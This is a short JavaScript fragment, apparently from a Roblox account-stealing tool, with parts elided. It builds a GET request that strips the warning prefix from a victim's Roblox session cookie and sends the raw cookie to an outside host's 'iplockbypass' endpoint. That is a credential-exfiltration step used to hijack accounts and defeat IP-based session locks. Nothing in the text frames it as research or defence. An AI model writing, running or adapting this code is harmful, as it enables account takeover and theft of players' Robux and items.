    ...
    return new Promise(async(resolve, reject) => {
        try {
            ...
            const body = {
                "body": "",
                "method": "GET",
                "uri": `https://eggy.cool/iplockbypass?cookie=${robloxCookie.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '')}`,
                "headers": [],
                "auth": {
                  "_t": "None"
                }
